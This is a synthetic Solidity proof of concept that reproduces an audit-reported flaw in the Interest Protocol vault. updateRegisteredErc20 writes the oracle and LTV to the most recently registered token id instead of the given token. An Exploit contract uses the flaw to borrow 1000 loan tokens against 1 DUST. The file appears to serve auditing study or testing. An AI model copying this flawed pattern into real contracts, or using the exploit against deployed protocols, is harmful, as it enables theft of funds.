// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Interest Protocol — updateRegisteredErc20 writes the last registered id
    (Sigma Prime). SYNTHETIC, cheatcode-free.
    The two storage writes are the lines the report quotes. _tokensRegistered
    is the id of the last token added (DUST), not token_address (GOLD).
    A later borrow of 1 DUST therefore pays 1000 loan tokens. */

interface IVault {
    function updateRegisteredErc20(
        address token_address,
        uint256 LTV,
        address oracle_address,
        uint256 liquidationIncentive
    ) external;
}

contract LoanToken {
    string public name = "USDi";
    string public symbol = "USDi";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PriceOracle {
    uint256 public price;

    constructor(uint256 _price) {
        price = _price;
    }
}

contract Vault is IVault {
    LoanToken public loan;
    address public owner;
    uint256 public _tokensRegistered;
    mapping(uint256 => address) public _tokenId_oracleAddress;
    mapping(uint256 => uint256) public _tokenId_tokenLTV;
    mapping(address => uint256) public tokenIdOf;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(LoanToken _loan, address _owner) {
        loan = _loan;
        owner = _owner;
    }

    function registerErc20(address token, address oracle, uint256 ltv) external onlyOwner {
        _tokensRegistered += 1;
        tokenIdOf[token] = _tokensRegistered;
        _tokenId_oracleAddress[_tokensRegistered] = oracle;
        _tokenId_tokenLTV[_tokensRegistered] = ltv;
    }

    function updateRegisteredErc20(
        address token_address,
        uint256 LTV,
        address oracle_address,
        uint256 liquidationIncentive
    ) external override onlyOwner virtual {
        token_address;
        liquidationIncentive;
        // SigP: Note _tokensRegistered is used below, instead of token_address passed in as a parameter to this function.
        // @> VULN: both writes use the last registered id, so GOLD's update lands on DUST.
        _tokenId_oracleAddress[_tokensRegistered] = oracle_address;
        _tokenId_tokenLTV[_tokensRegistered] = LTV;
    }

    function borrow(address collateral, uint256 amount) external returns (uint256 out) {
        uint256 id = tokenIdOf[collateral];
        uint256 px = PriceOracle(_tokenId_oracleAddress[id]).price();
        uint256 ltv = _tokenId_tokenLTV[id];
        out = amount * px / 1e18 * ltv / 10000;
        loan.transfer(msg.sender, out);
    }
}

contract Exploit {
    address public constant GOLD = address(0x1111111111111111111111111111111111110001);
    address public constant DUST = address(0x1111111111111111111111111111111111110002);
    uint256 public constant N = 1000 ether;

    LoanToken public loan; // nonce 1
    PriceOracle public goldOracle; // nonce 2, price 500e18
    PriceOracle public dustOracle; // nonce 3, price 1e18
    PriceOracle public richOracle; // nonce 4, price 1000e18
    Vault public vault; // nonce 5

    uint256 public paid;
    address public dustOracleAfter;
    address public goldOracleAfter;

    constructor() {
        loan = new LoanToken();
        goldOracle = new PriceOracle(500 ether);
        dustOracle = new PriceOracle(1 ether);
        richOracle = new PriceOracle(N);
        vault = new Vault(loan, address(this));
    }

    function run() external {
        vault.registerErc20(GOLD, address(goldOracle), 5000);
        vault.registerErc20(DUST, address(dustOracle), 5000);
        loan.mint(address(vault), N);
        vault.updateRegisteredErc20(GOLD, 10000, address(richOracle), 0);
        dustOracleAfter = vault._tokenId_oracleAddress(2);
        goldOracleAfter = vault._tokenId_oracleAddress(1);
        paid = vault.borrow(DUST, 1 ether);
        require(dustOracleAfter == address(richOracle), "DUST did not receive the new oracle");
        require(goldOracleAfter == address(goldOracle), "GOLD was the token that should have changed");
        require(paid == N, "borrow did not pay 1000");
        require(loan.balanceOf(address(this)) == N, "1000 not received");
    }
}
